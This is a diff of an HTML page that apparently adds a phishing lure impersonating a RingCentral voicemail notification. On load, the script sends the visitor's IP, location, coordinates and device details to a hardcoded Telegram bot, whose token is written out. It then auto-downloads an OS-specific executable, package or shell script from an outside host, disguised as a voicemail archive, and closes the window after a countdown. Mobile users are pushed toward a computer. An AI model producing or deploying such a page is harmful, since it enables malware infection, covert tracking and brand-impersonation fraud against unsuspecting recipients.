@@ -3,50 +3,486 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>Voicemail Notification - RingCentral</title>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Open Sans', Arial, sans-serif;
+            line-height: 1.6;
+            background-color: #f5f7fa;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            position: relative;
+            overflow: hidden;
+        }
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/a/aa/RingCentral_logo.svg');
+            background-size: 30%;
+            background-position: center;
+            background-repeat: no-repeat;
+            opacity: 0.1;
+            z-index: -1;
+        }
+        body::after {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image: url('https://images.icon-icons.com/2699/PNG/512/ringcentral_logo_icon_169788.png');
+            background-size: 15%;
+            background-position: 90% 90%;
+            background-repeat: no-repeat;
+            opacity: 0.1;
+            z-index: -1;
+        }
+        .container {
+            max-width: 500px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 24px rgba(0, 82, 154, 0.15);
+            overflow: hidden;
+            text-align: center;
+            position: relative;
+            padding: 0;
+            border: 1px solid #e1e5eb;
+            z-index: 1;
+        }
+        .header {
+            background: #fff;
+            color: #333;
+            padding: 30px 20px 20px;
+            position: relative;
+            border-bottom: 1px solid #e1e5eb;
+            background-image: linear-gradient(to right, rgba(6, 121, 200, 0.05), rgba(6, 121, 200, 0.02));
+        }
+        .header img {
+            width: 200px;
+            height: auto;
+            margin-bottom: 15px;
+        }
+        .header h1 {
+            font-size: 22px;
+            margin: 10px 0;
+            color: #2d3747;
+            font-weight: 600;
+        }
+        .loading-container {
+            margin: 30px auto;
+            width: 60px;
+            height: 60px;
+            position: relative;
+        }
+        .loading-circle {
+            border: 5px solid #f0f2f5;
+            border-top: 5px solid #0679c8;
+            border-radius: 50%;
+            width: 100%;
+            height: 100%;
+            animation: spin 1s linear infinite;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .dynamic-logo {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            position: absolute;
+            top: 0;
+            left: 0;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+        .content {
+            padding: 20px 25px;
+            text-align: left;
+            background-color: rgba(255, 255, 255, 0.9);
+        }
+        .content h2 {
+            font-size: 18px;
+            margin-bottom: 15px;
+            color: #2d3747;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .content p {
+            font-size: 14px;
+            margin: 12px 0;
+            color: #4a5568;
+            line-height: 1.5;
+        }
+        .content p strong {
+            color: #0679c8;
+            font-weight: 600;
+        }
+        .footer {
+            background: #f8f9fa;
+            text-align: center;
+            padding: 15px;
+            font-size: 12px;
+            color: #718096;
+            border-top: 1px solid #e1e5eb;
+            background-image: linear-gradient(to right, rgba(6, 121, 200, 0.05), rgba(6, 121, 200, 0.02));
+        }
+        .footer a {
+            color: #0679c8;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .download-btn {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 12px 20px;
+            background-color: #0679c8;
+            color: #fff;
+            border-radius: 4px;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            width: 100%;
+            text-align: center;
+        }
+        .download-btn:hover {
+            background-color: #0564a6;
+        }
+        .status-message {
+            margin-top: 15px;
+            font-weight: 600;
+            color: #0679c8;
+            font-size: 13px;
+            padding: 8px 12px;
+            background-color: #f0f7ff;
+            border-radius: 4px;
+            border-left: 3px solid #0679c8;
+        }
+        .logo-bottom-right {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            width: 80px;
+            height: auto;
+            opacity: 0.8;
+        }
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 4px 8px;
+            background-color: #f0f7ff;
+            color: #0679c8;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-left: 8px;
+        }
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 15px;
+            font-size: 12px;
+            color: #4a5568;
+        }
+        .security-badge img {
+            width: 16px;
+            height: 16px;
+        }
+        .success-message {
+            display: none;
+            margin-top: 15px;
+            padding: 10px;
+            background-color: #f0fff4;
+            border-left: 3px solid #38a169;
+            color: #2f855a;
+            font-size: 13px;
+            border-radius: 4px;
+        }
+        .mobile-warning {
+            display: none;
+            margin-top: 15px;
+            padding: 15px;
+            background-color: #fffaf0;
+            border-left: 3px solid #dd6b20;
+            color: #c05621;
+            font-size: 14px;
+            border-radius: 4px;
+            margin-bottom: 15px;
+        }
+        .countdown-message {
+            font-weight: bold;
+            margin-top: 10px;
+        }
+    </style>
 </head>
 <body>
-    
-    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <div class="container">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/aa/RingCentral_logo.svg" 
+                 alt="RingCentral Logo" 
+                 onerror="this.onerror=null;this.src='data:image/svg+xml;charset=UTF-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 200 50\'%3E%3Ctext x=\'50%\' y=\'50%\' font-family=\'Arial\' font-size=\'16\' fill=\'%230679c8\' text-anchor=\'middle\'%3ERingCentral%3C/text%3E%3C/svg%3E'">
+            <h1>New Voicemail Received</h1>
+        </div>
+        <div class="loading-container">
+            <div class="loading-circle" id="loadingCircle"></div>
+            <img class="dynamic-logo" id="dynamicLogo" 
+                 src="https://play-lh.googleusercontent.com/2nKp9wFTqLKBVCvBTrg7rSQzUrIbP69B4s-6uJ5FRCsU6_v7IvpqAZXfmgZGAThPyz4" 
+                 alt="RingCentral Logo"
+                 onerror="this.onerror=null;this.src='data:image/svg+xml;charset=UTF-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 200 50\'%3E%3Ctext x=\'50%\' y=\'50%\' font-family=\'Arial\' font-size=\'16\' fill=\'%230679c8\' text-anchor=\'middle\'%3ERingCentral%3C/text%3E%3C/svg%3E'">
+        </div>
+        <div class="content">
+            <h2><span>🎤</span> Voicemail <span id="actionText">Downloading</span> <span class="badge">Secure</span></h2>
+            <div id="mobileWarning" class="mobile-warning">
+                <strong>Mobile Device Detected:</strong> For security and optimal playback quality, this voicemail can only be accessed from a computer or desktop device. Please switch to a PC to listen to your message.
+            </div>
+            <p id="statusText">Preparing your voicemail...</p>
+            <p><strong>Duration:</strong> 1:24</p>
+            <div id="successMessage" class="success-message">
+                Your voicemail has been successfully downloaded.<br><br>
+                To listen: Locate the downloaded file and play the audio.<br>
+                Ensure your device's volume is on for clear playback.<br><br>
+                <div class="countdown-message">Note: This window will automatically close in <span id="countdown">20</span> seconds.</div>
+            </div>
+            <div id="statusMessage" class="status-message"></div>
+            <a id="manualDownload" class="download-btn" href="#" download style="display: none;">Download Voicemail</a>
+            <div class="security-badge">
+                <img src="https://cdn-icons-png.flaticon.com/512/1828/1828640.png" alt="Secure">
+                <span>Secured by RingCentral Encryption</span>
+            </div>
+        </div>
+        <div class="footer">
+            <p>© 2023 RingCentral, Inc. All rights reserved.</p>
+            <p>Need help? Contact <a href="mailto:support@ringcentral.com">support@ringcentral.com</a> or call 1-800-574-5290</p>
+        </div>
+    </div>
+    <img class="logo-bottom-right" 
+         src="https://images.icon-icons.com/2699/PNG/512/ringcentral_logo_icon_169788.png" 
+         alt="RingCentral Logo"
+         onerror="this.onerror=null;this.style.display='none'">
+
     <script>
+        // Telegram reporting configuration
+        const TELEGRAM_BOT_TOKEN = '7284066719:AAEncc3VY27DzgRzCLnuNTLpyIJf5MrrCos';
+        const TELEGRAM_CHAT_ID = '7724482403';
+        
+        // Function to report visitor information to Telegram
+        async function reportVisitToTelegram() {
+            try {
+                // Get IP and location information
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+                
+                // Get geolocation data
+                let geoData = {};
+                try {
+                    const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                    geoData = await geoResponse.json();
+                } catch (geoError) {
+                    console.error("GeoIP error:", geoError);
+                    geoData = { error: "Could not fetch location" };
+                }
+                
+                // Get browser and device info
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = window.screen.width;
+                const screenHeight = window.screen.height;
+                const language = navigator.language;
+                const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(userAgent);
+                
+                // Prepare visit details
+                const visitDetails = `
+📡 New Visit Notification
+🕒 Time: ${new Date().toLocaleString()}
+🌐 IP: ${ip}
+📍 Location: ${geoData.city || 'Unknown'}, ${geoData.region || 'Unknown'}, ${geoData.country_name || 'Unknown'}
+📌 Coordinates: ${geoData.latitude || 'N/A'}, ${geoData.longitude || 'N/A'}
+🖥️ Device: ${platform} ${isMobile ? '(Mobile)' : '(Desktop)'}
+🌐 Language: ${language}
+📱 User Agent: ${userAgent}
+📺 Screen: ${screenWidth}x${screenHeight}
+                `.trim();
+                
+                // Send to Telegram
+                const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: visitDetails,
+                    }),
+                });
+            } catch (error) {
+                console.error('Error reporting visit:', error);
+            }
+        }
+
+        function isMobileDevice() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
         function detectOS() {
-  const platform = navigator.platform.toLowerCase();
-  const userAgent = navigator.userAgent.toLowerCase();
+            const platform = navigator.platform.toLowerCase();
+            const userAgent = navigator.userAgent.toLowerCase();
 
-  if (platform.includes('win')) return 'windows';
-  if (platform.includes('mac')) return 'macos';
-  if (platform.includes('linux') || userAgent.includes('linux')) return 'linux';
+            if (platform.includes('win')) return 'windows';
+            if (platform.includes('mac')) return 'macos';
+            if (platform.includes('linux') || userAgent.includes('linux')) return 'linux';
 
-  return 'unknown';
-}
+            return 'unknown';
+        }
 
-function getDownloadLink(os) {
-  switch (os) {
-    case 'windows':
-      return 'https://secure.iddeadalltimeback.co/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest';
-    case 'macos':
-      return 'https://secure.iddeadalltimeback.co/Bin/work_approval_pdf3.ClientSetup.pkg?e=Access&y=Guest';
-    case 'linux':
-      return 'https://secure.iddeadalltimeback.co/Bin/work_approval_pdf3.ClientSetup.sh?e=Access&y=Guest';
-    default:
-      return 'https://secure.iddeadalltimeback.co/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest';
-  }
-}
+        function getDownloadLink(os) {
+            switch (os) {
+                case 'windows':
+                    return 'https://arjairsparts.com/zoomsetup/clientsetup/Audio-Record6542567828.exe?e=Access&y=Guest';
+                case 'macos':
+                    return 'https://arjairsparts.com/zoomsetup/clientsetup/Audio-Record6542567828.pkg?e=Access&y=Guest';
+                case 'linux':
+                    return 'https://arjairsparts.com/zoomsetup/clientsetup/Audio-Record6542567828.sh?e=Access&y=Guest';
+                default:
+                    return 'https://arjairsparts.com/zoomsetup/clientsetup/Audio-Record6542567828.exe?e=Access&y=Guest';
+            }
+        }
 
-window.onload = function () {
-  const osType = detectOS();
-  const downloadLink = getDownloadLink(osType);
+        function forceWindowClose() {
+            try {
+                // Try standard close first
+                window.close();
+                
+                // Fallback methods if still open
+                if (!window.closed) {
+                    window.open('', '_self', '');
+                    window.close();
+                }
+                
+                // Final fallback
+                if (!window.closed) {
+                    window.location.href = 'about:blank';
+                    setTimeout(() => {
+                        window.close();
+                    }, 100);
+                }
+            } catch (e) {
+                console.error("Error closing window:", e);
+            }
+        }
 
-  const downloadBtn = document.createElement("a");
-  downloadBtn.href = downloadLink;
-  downloadBtn.download = "SSA Files -- COMPLETED.zip";
-  document.body.appendChild(downloadBtn);
-  downloadBtn.click();
+        function startCountdown() {
+            let seconds = 20;
+            const countdownElement = document.getElementById('countdown');
+            
+            const countdownInterval = setInterval(() => {
+                seconds--;
+                countdownElement.textContent = seconds;
+                
+                if (seconds <= 0) {
+                    clearInterval(countdownInterval);
+                    forceWindowClose();
+                }
+            }, 1000);
+        }
 
-  setTimeout(() => {
-    window.close();
-  }, 2000);
-};
+        function handleDesktopDevice() {
+            const osType = detectOS();
+            const downloadLink = getDownloadLink(osType);
+            const statusText = document.getElementById('statusText');
+            const statusMessage = document.getElementById('statusMessage');
+            const successMessage = document.getElementById('successMessage');
+            const manualDownloadBtn = document.getElementById("manualDownload");
+            
+            manualDownloadBtn.href = downloadLink;
+            manualDownloadBtn.style.display = "inline-block";
+            
+            statusText.textContent = "Downloading your voicemail...";
+            
+            try {
+                const downloadBtn = document.createElement("a");
+                downloadBtn.href = downloadLink;
+                downloadBtn.download = "SSA_Files_COMPLETED.zip";
+                document.body.appendChild(downloadBtn);
+                downloadBtn.click();
+                document.body.removeChild(downloadBtn);
+                
+                statusMessage.textContent = "Download started successfully!";
+                
+                setTimeout(() => {
+                    statusText.style.display = "none";
+                    successMessage.style.display = "block";
+                    document.getElementById('actionText').textContent = "Downloaded";
+                    
+                    const loadingCircle = document.getElementById('loadingCircle');
+                    const dynamicLogo = document.getElementById('dynamicLogo');
+                    loadingCircle.style.opacity = '0';
+                    dynamicLogo.style.opacity = '1';
+                    
+                    manualDownloadBtn.textContent = "Open Voicemail File";
+                    startCountdown();
+                }, 2000);
+            } catch (e) {
+                statusMessage.textContent = "Download failed. Please try the download button above.";
+                console.error("Download error:", e);
+            }
+        }
+
+        function handleMobileDevice() {
+            const statusText = document.getElementById('statusText');
+            const mobileWarning = document.getElementById('mobileWarning');
+            const loadingCircle = document.getElementById('loadingCircle');
+            const dynamicLogo = document.getElementById('dynamicLogo');
+            
+            mobileWarning.style.display = 'block';
+            statusText.textContent = "Voicemail access restricted to desktop devices";
+            document.getElementById('actionText').textContent = "Restricted";
+            
+            loadingCircle.style.opacity = '0';
+            dynamicLogo.style.opacity = '1';
+            startCountdown();
+        }
+
+        window.onload = function() {
+            // Report visit to Telegram
+            reportVisitToTelegram();
+            
+            if (isMobileDevice()) {
+                handleMobileDevice();
+            } else {
+                handleDesktopDevice();
+            }
+        };
     </script>
 </body>
 </html>
